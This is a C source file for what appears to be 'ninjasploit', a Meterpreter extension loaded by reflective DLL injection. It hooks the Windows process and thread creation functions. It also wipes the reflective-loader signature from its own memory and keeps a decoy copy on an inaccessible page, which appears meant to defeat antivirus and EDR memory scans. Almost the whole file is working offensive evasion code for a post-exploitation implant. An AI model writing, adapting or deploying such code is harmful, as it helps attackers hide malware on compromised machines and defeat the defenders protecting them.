/*!
 * @file bare.c
 * @brief Entry point and intialisation functionality for the bare extention.
 */
#include "common.h"
#include "common_metapi.h"

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "definitions.h"
#include "ninjasploit.h"

#include "customhooks.h"
#include "memory.h"

MetApi* met_api = NULL;

DWORD install_hooks(Remote *remote, Packet *packet);
DWORD restore_hooks(Remote *remote, Packet *packet);
BOOL verifyNullMem(LPVOID addr, SIZE_T size);

DWORD ninjasploit_install_hooks(Remote *remote, Packet *packet) {

	Packet* response = met_api->packet.create_response(packet);
	dprintf("ninjasploit_install_hooks start");
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	NtCreateThreadEx = (PNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

	allocatedAddresses = getAllocatedAddresses(PAGE_EXECUTE_READWRITE);

	DuplicateHandle(GetCurrentProcess(), remote->server_thread, GetCurrentProcess(), &metasploitThread, NULL, FALSE, DUPLICATE_SAME_ACCESS);

	// install hooks
	createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);
	createRemoteThreadHookResult = installHook(NtCreateThreadEx, hookCreateRemoteThreadEx, 5);

	SIGNATURE sig;
	sig.signature = "\x5F\x52\x65\x66\x6C\x65\x63\x74\x69\x76\x65\x4C\x6F\x61\x64\x65\x72\x40\x30\x00";
	sig.sigSize = 20;

	detectableSignature = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	for (SIZE_T i = 0; i < sig.sigSize; i++) {
		detectableSignature[i] = sig.signature[i];
	}

	DWORD dummy;

	VirtualProtect(detectableSignature, 0x1000, PAGE_NOACCESS, &dummy);

	MEMORY_BASIC_INFORMATION info = { 0 };

	VirtualQuery((LPVOID)ninjasploit_install_hooks, &info, sizeof(MEMORY_BASIC_INFORMATION));

	PATTERN_RESULT signatures = { 0 }; 
	signatures.sigs = malloc(sizeof(SIZE_T) * 10);

	patternScanEx((SIZE_T)info.AllocationBase, info.RegionSize, "xxxxxxxxxxxxxxxxxxxx", &sig, &signatures, 10);

	for (SIZE_T i = 0; i < signatures.size; i++) {
		DWORD protect, dummy;

		VirtualQuery((LPVOID)signatures.sigs[i], &info, sizeof(MEMORY_BASIC_INFORMATION));

		if (info.Protect != PAGE_NOACCESS) {
			VirtualProtect((LPVOID)signatures.sigs[i], sig.sigSize, PAGE_READWRITE, &protect);

			SecureZeroMemory((LPVOID)signatures.sigs[i], sig.sigSize);
			VirtualProtect((LPVOID)signatures.sigs[i], sig.sigSize, protect, &dummy);
		}
	}

	free(signatures.sigs);

	met_api->packet.add_tlv_string(response, TLV_TYPE_NINJASPLOIT_INSTALL_HOOKS, "Hooks installed!");
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	dprintf("ninjasploit_install_hooks finish");
	return ERROR_SUCCESS;
}


DWORD ninjasploit_restore_hooks(Remote *remote, Packet *packet) {
	dprintf("ninjasploit_restore_hooks start");
	Packet* response = met_api->packet.create_response(packet);

	BOOL restored = FALSE;
	dprintf("ninjasploit_restore_hooks start");
	if (createProcessHookResult != NULL) {
		restoreHook(createProcessHookResult);
		restored = TRUE;
	}
	dprintf("ninjasploit_restore_hooks min");
	if (createRemoteThreadHookResult != NULL) {
		restoreHook(createRemoteThreadHookResult);
		restored = TRUE;
	}
	dprintf("ninjasploit_restore_hooks fin");
	PCHAR msg = restored ? "Restored all hooks" : "There was no hooks to restore";

	met_api->packet.add_tlv_string(response, TLV_TYPE_NINJASPLOIT_RESTORE_HOOKS, msg);
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_NINJASPLOIT_INSTALL_HOOK, ninjasploit_install_hooks),
	COMMAND_REQ(COMMAND_ID_NINJASPLOIT_RESTORE_HOOK, ninjasploit_restore_hooks),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;

	met_api->command.register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote* remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}
/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}